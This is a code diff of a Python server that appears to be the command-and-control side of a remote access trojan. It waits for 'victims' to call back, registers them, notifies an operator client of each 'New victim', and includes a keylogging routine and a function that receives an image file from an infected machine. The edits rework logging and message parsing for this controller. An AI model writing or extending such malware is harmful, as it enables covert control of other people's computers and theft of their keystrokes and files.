@@ -40,6 +40,8 @@ class Server:
     s.bind((getIP("d"), port))
     s.listen(5)
     DB = db.DB()
+    currentConnections = []
+    clientConnected = False
 
     @staticmethod
     def newConn(nc):
@@ -55,7 +57,7 @@ class Server:
             except:
                 ip = nc.ip
                 hostname = nc.hostname
-                Server.updateTextbox(hostname + "@ " + str(ip[0]) + " has disconnected...\n")
+                print("disconnect")
                 return
 
 
@@ -74,35 +76,25 @@ class Server:
         """
         used in thread when waiting for victims to callback
         """
-        Server.updateTextbox("Waiting for connections...\n")
         while (True):
             global s
             c, addr = Server.s.accept()
             hostname = Server.trimMessage(Server.recvMsg(c))
             uniq = Server.trimMessage(Server.recvMsg(c))
+            print(hostname)
             print(uniq)
+            nc = Connection.Connection(uniq, addr, hostname)
             if(uniq == "-1"):
-                c.send("Welcome to the server...\n")
-                #client connected, not victim
+                Server.sendMsg(c, "Welcome to the server...\n")
+                Server.clientConnected = True
+                Server.cli = c
             else:
-                nc = Connection.Connection(uniq ,addr, hostname, c)
-                Server.updateTextbox(str(nc.hostname) + "@ " + str(nc.ip[0]) + " has connected..." +"\n")
-                #cli.connections.append(str(nc.unique) + " - "+str(nc.ip[0]) + " - " + str(nc.hostname))
-                #cli.redrawClientMenu()
+                if(Server.clientConnected):
+                    Server.sendMsg(Server.cli, "New victim...\n")
+                    Server.sendMsg(Server.cli ,str(nc))
                 t = threading.Thread(target=Server.newConn, args=[nc])
                 t.setDaemon(True)
                 t.start()
-
-    @staticmethod
-    def updateTextbox(s):
-        """
-        sends string to be put into text box on client GUI
-        :param s: string
-        :return:
-        """
-        print(s)
-        #cli.text.config(state=NORMAL)
-        #cli.text.insert(END, s)
 
     @staticmethod
     def keyLog(conn):
@@ -147,7 +139,7 @@ class Server:
         sock.send("send")
         f = open("test.jpg", "w")
         while (True):
-            line = sock.recv(1024)
+            line = sock.recv(255)
             print(line)
             f.write(line)
 
@@ -159,7 +151,10 @@ class Server:
     @staticmethod
     def recvMsg(sock):
         rawMsgLen = Server.recvall(sock, 4)
-        msgLen = struct.unpack('>I', rawMsgLen)[0]
+        if(rawMsgLen[0] == "0"):
+            msgLen = int(rawMsgLen, 0)
+        else:
+            msgLen = struct.unpack('>I', rawMsgLen)[0]
         return Server.recvall(sock, msgLen)
 
     @staticmethod
